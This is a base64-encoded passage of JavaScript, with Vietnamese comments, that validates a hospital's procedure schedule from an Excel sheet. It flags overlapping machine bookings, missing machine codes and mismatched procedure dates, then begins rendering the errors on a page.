PDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCWRvY3RvcjogZG9jdG9ySW5kZXggIT09IC0xID8gcm93W2RvY3RvckluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsIC8vIFRow6ptIGLDoWMgc+G7uQ0KICAgICAgICAgICAgICAgICAgICBkYXRlOiBzdGFydC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICBzdGFydDogc3RhcnQuc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgZW5kOiBlbmQuc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgICAgICAgICAgICAgZGlzcGxheUVuZDogZW5kLmRpc3BsYXlUaW1lLA0KICAgICAgICAgICAgICAgICAgICBtYWNoaW5lQ29kZTogbWFjaGluZUNvZGUsDQogICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZUluZm86IHByb2NlZHVyZUluZm8NCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoYEzhu5dpIHjhu60gbMO9IG3DoXkgZMOybmcgJHtyb3dOdW1iZXJ9OmAsIGVycm9yKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KICAgIA0KICAgIC8vIEtp4buDbSB0cmEgeHVuZyDEkeG7mXQgdGhlbyB04burbmcgbcOheSBWw4AgdOG7q25nIG5nw6B5DQogICAgY29uc3QgbWFjaGluZUdyb3VwcyA9IHt9Ow0KICAgIA0KICAgIG1hY2hpbmVQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGNvbnN0IGtleSA9IGAke3Byb2MubWFjaGluZUNvZGV9XyR7cHJvYy5kYXRlfWA7IC8vIEvhur90IGjhu6NwIG3DoyBtw6F5ICsgbmfDoHkNCiAgICAgICAgaWYgKCFtYWNoaW5lR3JvdXBzW2tleV0pIHsNCiAgICAgICAgICAgIG1hY2hpbmVHcm91cHNba2V5XSA9IFtdOw0KICAgICAgICB9DQogICAgICAgIG1hY2hpbmVHcm91cHNba2V5XS5wdXNoKHByb2MpOw0KICAgIH0pOw0KICAgIA0KICAgIE9iamVjdC52YWx1ZXMobWFjaGluZUdyb3VwcykuZm9yRWFjaChwcm9jZWR1cmVzID0+IHsNCiAgICAgICAgaWYgKHByb2NlZHVyZXMubGVuZ3RoIDwgMikgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgcHJvY2VkdXJlcy5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQogICAgICAgIA0KICAgICAgICBmb3IgKGxldCBpID0gMTsgaSA8IHByb2NlZHVyZXMubGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICAgIGNvbnN0IHByZXYgPSBwcm9jZWR1cmVzW2kgLSAxXTsNCiAgICAgICAgICAgIGNvbnN0IGN1cnJlbnQgPSBwcm9jZWR1cmVzW2ldOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIHhlbSBjw7MgeHVuZyDEkeG7mXQgdGjhu51pIGdpYW4ga2jDtG5nDQogICAgICAgICAgICBpZiAoY3VycmVudC5zdGFydCA8IHByZXYuZW5kKSB7DQogICAgICAgICAgICAgICAgbWFjaGluZUNvbmZsaWN0TG9nLnB1c2goew0KICAgICAgICAgICAgICAgICAgICBtYWNoaW5lQ29kZTogcHJldi5tYWNoaW5lQ29kZSwNCiAgICAgICAgICAgICAgICAgICAgZGF0ZTogcHJldi5kYXRlLCAvLyBUaMOqbSBuZ8OgeSDEkeG7gyBoaeG7g24gdGjhu4sNCiAgICAgICAgICAgICAgICAgICAgY29uZmxpY3RQcm9jZWR1cmVzOiBbcHJldiwgY3VycmVudF0sDQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U6IGBNw6F5ICR7cHJldi5tYWNoaW5lQ29kZX0gxJHGsOG7o2Mgc+G7rSBk4bulbmcgxJHhu5NuZyB0aOG7nWkgY2hvIG5oaeG7gXUgYuG7h25oIG5ow6JuIHRyb25nIG5nw6B5ICR7cHJldi5kYXRlfWANCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0pOw0KfQ0KZnVuY3Rpb24gY2hlY2tNaXNzaW5nTWFjaGluZUNvZGVzKHByb2NlZHVyZXMsIGpzb25EYXRhKSB7DQogICAgbWlzc2luZ01hY2hpbmVMb2cgPSBbXTsNCiAgICANCiAgICBjb25zdCBoZWFkZXJMaW5lMSA9IGpzb25EYXRhWzddIHx8IFtdOw0KICAgIGNvbnN0IGhlYWRlckxpbmUyID0ganNvbkRhdGFbOF0gfHwgW107DQogICAgY29uc3QgY29tYmluZWRIZWFkZXJzID0gaGVhZGVyTGluZTEubWFwKChjb2wsIGluZGV4KSA9PiANCiAgICAgICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCiAgICApOw0KDQogICAgLy8gVMOsbSBj4buZdCBtw6MgbcOheQ0KICAgIGNvbnN0IG1hY2hpbmVDb2RlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gDQogICAgICAgIGguaW5jbHVkZXMoIk3DoyBtw6F5IikgfHwgaC5pbmNsdWRlcygiTcOjIG3DoXkgdGhlbyB0aOG7pyB0aHXhuq10IikNCiAgICApOw0KICAgICAgLy8gVMOsbSBj4buZdCBiw6FjIHPhu7kgY2jhu4kgxJHhu4tuaA0KICAgIGNvbnN0IGRvY3RvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkLDoWMgc+G7uSBjaOG7iSDEkeG7i25oIikpOw0KDQogICAgaWYgKG1hY2hpbmVDb2RlSW5kZXggPT09IC0xKSB7DQogICAgICAgIGNvbnNvbGUubG9nKCJLaMO0bmcgdMOsbSB0aOG6pXkgY+G7mXQgbcOjIG3DoXkgdHJvbmcgZmlsZSBFeGNlbCIpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8gVMOsbSBjw6FjIGPhu5l0IGtow6FjIGPhuqduIHRoaeG6v3QNCiAgICBjb25zdCBwcm9jZWR1cmVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpOw0KICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQoJY29uc3QgcGF0aWVudElkSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTcOjIEJOIikpOw0KCWNvbnN0IHBhdGllbnRhZ2VJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUdeG7lWkiKSk7DQogICAgY29uc3Qgb3BlcmF0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IGNow61uaCIpKTsNCiAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgIGNvbnN0IGVuZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGvhur90IHRow7pjIikpOw0KICAgIGNvbnN0IGRhdGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJOZ8OgeSB0aOG7sWMgaGnhu4duIikpOw0KDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIA0KICAgIC8vIERhbmggc8OhY2ggdGjhu6cgdGh14bqtdCBj4bqnbiBraeG7g20gdHJhIG3DoyBtw6F5DQogICAgY29uc3QgcHJvY2VkdXJlc1RvQ2hlY2sgPSBbDQogICAgICAgICLEkWnhu4duIGNow6JtIFtraW0gbmfhuq9uXSIsDQogICAgICAgICLEkWnhu4F1IHRy4buLIGLhurFuZyB0aWEgaOG7k25nIG5nb+G6oWkiLCANCiAgICAgICAgImdpw6FjIGjGoWkiDQogICAgXTsNCiAgICANCiAgICByb3dzLmZvckVhY2goKHJvdywgaW5kZXgpID0+IHsNCiAgICAgICAgY29uc3Qgcm93TnVtYmVyID0gaW5kZXggKyAxMDsNCiAgICAgICAgDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoIXJvdyB8fCByb3cubGVuZ3RoID09PSAwKSByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZU5hbWUgPSAocm93W3Byb2NlZHVyZUluZGV4XSB8fCAnJykudG9TdHJpbmcoKS50cmltKCk7DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gS2nhu4NtIHRyYSB4ZW0gdGjhu6cgdGh14bqtdCBjw7MgdHJvbmcgZGFuaCBzw6FjaCBj4bqnbiBraeG7g20gdHJhIGtow7RuZw0KICAgICAgICAgICAgY29uc3Qgc2hvdWxkQ2hlY2sgPSBwcm9jZWR1cmVzVG9DaGVjay5zb21lKHByb2MgPT4gDQogICAgICAgICAgICAgICAgcHJvY2VkdXJlTmFtZS50b0xvd2VyQ2FzZSgpLmluY2x1ZGVzKHByb2MudG9Mb3dlckNhc2UoKSkNCiAgICAgICAgICAgICk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICghc2hvdWxkQ2hlY2spIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSAocm93W21hY2hpbmVDb2RlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZURhdGUgPSBkYXRlSW5kZXggIT09IC0xID8gKHJvd1tkYXRlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKSA6ICcnOw0KICAgICAgICAgICAgY29uc3Qgc3RhcnRUaW1lVmFsdWUgPSAocm93W3N0YXJ0SW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIC8vIE7hur91IG3DoyBtw6F5IHRy4buRbmcgdGjDrCBiw6FvIGzhu5dpDQogICAgICAgICAgICBpZiAoIW1hY2hpbmVDb2RlICYmIHN0YXJ0VGltZVZhbHVlKSB7DQogICAgICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICBjb25zdCBlbmQgPSBwYXJzZURhdGVUaW1lKHJvd1tlbmRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgbWlzc2luZ01hY2hpbmVMb2cucHVzaCh7DQogICAgICAgICAgICAgICAgICAgIHJvd051bWJlcjogcm93TnVtYmVyLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogb3BlcmF0b3JJbmRleCAhPT0gLTEgPyByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlkb2N0b3I6IGRvY3RvckluZGV4ICE9PSAtMSA/IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLCAvLyBUaMOqbSBiw6FjIHPhu7kNCiAgICAgICAgICAgICAgICAgICAgZGF0ZTogcHJvY2VkdXJlRGF0ZSB8fCBzdGFydD8uZGF0ZUtleSB8fCAnS2jDtG5nIHjDoWMgxJHhu4tuaCcsDQogICAgICAgICAgICAgICAgICAgIHN0YXJ0VGltZTogc3RhcnQ/LmRpc3BsYXlUaW1lIHx8ICc/PycsDQogICAgICAgICAgICAgICAgICAgIGVuZFRpbWU6IGVuZD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgbWFjaGluZUNvZGU6IG1hY2hpbmVDb2RlDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kga2nhu4NtIHRyYSBtw6MgbcOheSBkw7JuZyAke3Jvd051bWJlcn06YCwgZXJyb3IpOw0KICAgICAgICB9DQogICAgfSk7DQp9DQoNCi8vIEjDoG0ga2nhu4NtIHRyYSB0aOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3Uga2jDoWMgbmfDoHkgdGjhu7FjIGhp4buHbg0KZnVuY3Rpb24gY2hlY2tEYXRlTWlzbWF0Y2gocHJvY2VkdXJlcywganNvbkRhdGEpIHsNCiAgICBkYXRlTWlzbWF0Y2hMb2cgPSBbXTsNCiAgICANCiAgICBjb25zdCBoZWFkZXJMaW5lMSA9IGpzb25EYXRhWzddIHx8IFtdOw0KICAgIGNvbnN0IGhlYWRlckxpbmUyID0ganNvbkRhdGFbOF0gfHwgW107DQogICAgY29uc3QgY29tYmluZWRIZWFkZXJzID0gaGVhZGVyTGluZTEubWFwKChjb2wsIGluZGV4KSA9PiANCiAgICAgICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCiAgICApOw0KDQogICAgLy8gVMOsbSBj4buZdCBuZ8OgeSB0aOG7sWMgaGnhu4duIHbDoCB0aOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UNCiAgICBjb25zdCBwcm9jZWR1cmVEYXRlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gDQogICAgICAgIGguaW5jbHVkZXMoIk5nw6B5IHRo4buxYyBoaeG7h24iKQ0KICAgICk7DQogICAgY29uc3Qgc3RhcnRUaW1lSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gDQogICAgICAgIGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikNCiAgICApOw0KICAgIA0KICAgIC8vIFTDrG0gY+G7mXQgYsOhYyBz4bu5IGNo4buJIMSR4buLbmgNCiAgICBjb25zdCBkb2N0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaCIpKTsNCg0KICAgIGlmIChwcm9jZWR1cmVEYXRlSW5kZXggPT09IC0xIHx8IHN0YXJ0VGltZUluZGV4ID09PSAtMSkgew0KICAgICAgICBjb25zb2xlLmxvZygiS2jDtG5nIHTDrG0gdGjhuqV5IGPhu5l0IE5nw6B5IHRo4buxYyBoaeG7h24gaG/hurdjIFRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIik7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyBUw6xtIGPDoWMgY+G7mXQga2jDoWMgY+G6p24gdGhp4bq/dA0KICAgIGNvbnN0IHByb2NlZHVyZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQiKSk7DQogICAgY29uc3QgbmFtZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkjhu40gdMOqbiIpKTsNCiAgICBjb25zdCBwYXRpZW50SWRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJNw6MgQk4iKSk7DQogICAgY29uc3QgcGF0aWVudGFnZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlR14buVaSIpKTsNCiAgICBjb25zdCBvcGVyYXRvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQgY2jDrW5oIikpOw0KDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIA0KICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IHJvd1twcm9jZWR1cmVJbmRleF07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUgfHwgIVBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0pIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlRGF0ZSA9IChyb3dbcHJvY2VkdXJlRGF0ZUluZGV4XSB8fCAnJykudG9TdHJpbmcoKS50cmltKCk7DQogICAgICAgICAgICBjb25zdCBzdGFydFRpbWVWYWx1ZSA9IChyb3dbc3RhcnRUaW1lSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFwcm9jZWR1cmVEYXRlIHx8ICFzdGFydFRpbWVWYWx1ZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBQYXJzZSBuZ8OgeSB0aOG7sWMgaGnhu4duDQogICAgICAgICAgICBsZXQgcHJvY2VkdXJlRGF5LCBwcm9jZWR1cmVNb250aCwgcHJvY2VkdXJlWWVhcjsNCiAgICAgICAgICAgIGlmIChwcm9jZWR1cmVEYXRlLmluY2x1ZGVzKCcvJykpIHsNCiAgICAgICAgICAgICAgICBjb25zdCBwYXJ0cyA9IHByb2NlZHVyZURhdGUuc3BsaXQoJy8nKTsNCiAgICAgICAgICAgICAgICBpZiAocGFydHMubGVuZ3RoID09PSAzKSB7DQogICAgICAgICAgICAgICAgICAgIFtwcm9jZWR1cmVEYXksIHByb2NlZHVyZU1vbnRoLCBwcm9jZWR1cmVZZWFyXSA9IHBhcnRzLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFwcm9jZWR1cmVEYXkgfHwgIXByb2NlZHVyZU1vbnRoIHx8ICFwcm9jZWR1cmVZZWFyKSByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIFBhcnNlIHRo4budaSBnaWFuIGLhuq90IMSR4bqndQ0KICAgICAgICAgICAgY29uc3Qgc3RhcnRUaW1lID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRUaW1lSW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgaWYgKCFzdGFydFRpbWUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gU28gc8OhbmggbmfDoHkNCiAgICAgICAgICAgIGNvbnN0IFtzdGFydERheSwgc3RhcnRNb250aCwgc3RhcnRZZWFyXSA9IHN0YXJ0VGltZS5kYXRlS2V5LnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIGPDsyBwaOG6o2kgbMOgIFPhuq9jIHRodeG7kWMgdGhhbmcga2jDtG5nDQogICAgICAgICAgICBjb25zdCBpc0hlcmJQcm9jZWR1cmUgPSBwcm9jZWR1cmVOYW1lLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoJ3Phuq9jIHRodeG7kWMgdGhhbmcnKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgbGV0IGlzRGF0ZU1pc21hdGNoID0gZmFsc2U7DQogICAgICAgICAgICBsZXQgZXJyb3JNZXNzYWdlID0gJyc7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChwcm9jZWR1cmVEYXkgIT09IHN0YXJ0RGF5IHx8IHByb2NlZHVyZU1vbnRoICE9PSBzdGFydE1vbnRoIHx8IHByb2NlZHVyZVllYXIgIT09IHN0YXJ0WWVhcikgew0KICAgICAgICAgICAgICAgIGlmIChpc0hlcmJQcm9jZWR1cmUpIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gVuG7m2kgU+G6r2MgdGh14buRYyB0aGFuZzoga2nhu4NtIHRyYSBu4bq/dSB0aOG7qSA2IC0+IHRo4bupIDcsIGNo4bunIG5o4bqtdA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9jRGF0ZSA9IG5ldyBEYXRlKHByb2NlZHVyZVllYXIsIHByb2NlZHVyZU1vbnRoIC0gMSwgcHJvY2VkdXJlRGF5KTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhcnREYXRlID0gbmV3IERhdGUoc3RhcnRZZWFyLCBzdGFydE1vbnRoIC0gMSwgc3RhcnREYXkpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJvY0RheU9mV2VlayA9IHByb2NEYXRlLmdldERheSgpOyAvLyAwPUNOLCAxPVQyLCAuLi4sIDU9VDYsIDY9VDcNCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhcnREYXlPZldlZWsgPSBzdGFydERhdGUuZ2V0RGF5KCk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAvLyBUw61uaCBz4buRIG5nw6B5IGNow6puaCBs4buHY2gNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZURpZmYgPSBzdGFydERhdGUuZ2V0VGltZSgpIC0gcHJvY0RhdGUuZ2V0VGltZSgpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXlEaWZmID0gTWF0aC5jZWlsKHRpbWVEaWZmIC8gKDEwMDAgKiAzNjAwICogMjQpKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIC8vIENo4buJIGNo4bqlcCBuaOG6rW4gbuG6v3U6IA0KICAgICAgICAgICAgICAgICAgICAvLyAtIE5nw6B5IHRo4buxYyBoaeG7h24gbMOgIHRo4bupIDYgKDUpIHbDoCB0aOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UgbMOgIHRo4bupIDcgKDYpIGhv4bq3YyBjaOG7pyBuaOG6rXQgKDApIGPhu6dhIHR14bqnbiDEkcOzDQogICAgICAgICAgICAgICAgICAgIC8vIC0gQ2jDqm5oIGzhu4djaCBraMO0bmcgcXXDoSAyIG5nw6B5DQogICAgICAgICAgICAgICAgICAgIGlmIChwcm9jRGF5T2ZXZWVrID09PSA1ICYmIChzdGFydERheU9mV2VlayA9PT0gNiB8fCBzdGFydERheU9mV2VlayA9PT0gMCkgJiYgZGF5RGlmZiA8PSAyKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAvLyBI4bujcCBs4buHOiB0aOG7qSA2IC0+IHRo4bupIDcgaG/hurdjIGNo4bunIG5o4bqtdA0KICAgICAgICAgICAgICAgICAgICAgICAgaXNEYXRlTWlzbWF0Y2ggPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlzRGF0ZU1pc21hdGNoID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yTWVzc2FnZSA9IGBT4bqvYyB0aHXhu5FjIHRoYW5nOiBOZ8OgeSB0aOG7sWMgaGnhu4duICgke3Byb2NlZHVyZURhdGV9KSBraMOhYyB24bubaSBuZ8OgeSBi4bqvdCDEkeG6p3UgKCR7c3RhcnRUaW1lLmRhdGVLZXl9KSBraMO0bmcgcGjhuqNpIHkgbOG7h25oIGThu7EgdHLDuS5gOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gVuG7m2kgdGjhu6cgdGh14bqtdCBraMOhYzogbHXDtG4gYsOhbyBs4buXaQ0KICAgICAgICAgICAgICAgICAgICBpc0RhdGVNaXNtYXRjaCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIGVycm9yTWVzc2FnZSA9IGBOZ8OgeSB0aOG7sWMgaGnhu4duICgke3Byb2NlZHVyZURhdGV9KSBraMOhYyB24bubaSBuZ8OgeSBi4bqvdCDEkeG6p3UgKCR7c3RhcnRUaW1lLmRhdGVLZXl9KWA7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoaXNEYXRlTWlzbWF0Y2gpIHsNCiAgICAgICAgICAgICAgICBkYXRlTWlzbWF0Y2hMb2cucHVzaCh7DQogICAgICAgICAgICAgICAgICAgIHJvd051bWJlcjogcm93TnVtYmVyLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogb3BlcmF0b3JJbmRleCAhPT0gLTEgPyByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBkb2N0b3I6IGRvY3RvckluZGV4ICE9PSAtMSA/IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmVEYXRlOiBwcm9jZWR1cmVEYXRlLA0KICAgICAgICAgICAgICAgICAgICBzdGFydFRpbWU6IHN0YXJ0VGltZS5kaXNwbGF5VGltZSwNCiAgICAgICAgICAgICAgICAgICAgc3RhcnREYXRlOiBzdGFydFRpbWUuZGF0ZUtleSwNCiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTogZXJyb3JNZXNzYWdlDQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICBjb25zb2xlLmVycm9yKGBM4buXaSBraeG7g20gdHJhIGRhdGUgbWlzbWF0Y2ggZMOybmcgJHtyb3dOdW1iZXJ9OmAsIGVycm9yKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KfQ0KDQoNCg0KDQoNCg0KDQovLyBIw6BtIGhp4buDbiB0aOG7iyBs4buXaSBn4bqvbiBzYWkgbcOheQ0KZnVuY3Rpb24gZGlzcGxheU1hY2hpbmVFcnJvcnMoKSB7DQogICAgY29uc3QgbWFjaGluZUVycm9yTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVFcnJvckxvZycpOw0KICAgIGNvbnN0IG1hY2hpbmVFcnJvclNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUVycm9yU2VjdGlvbicpOw0KICAgIA0KICAgIGlmIChtYWNoaW5lRXJyb3JMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1hY2hpbmVFcnJvckxvZ0Rpdi5pbm5lckhUTU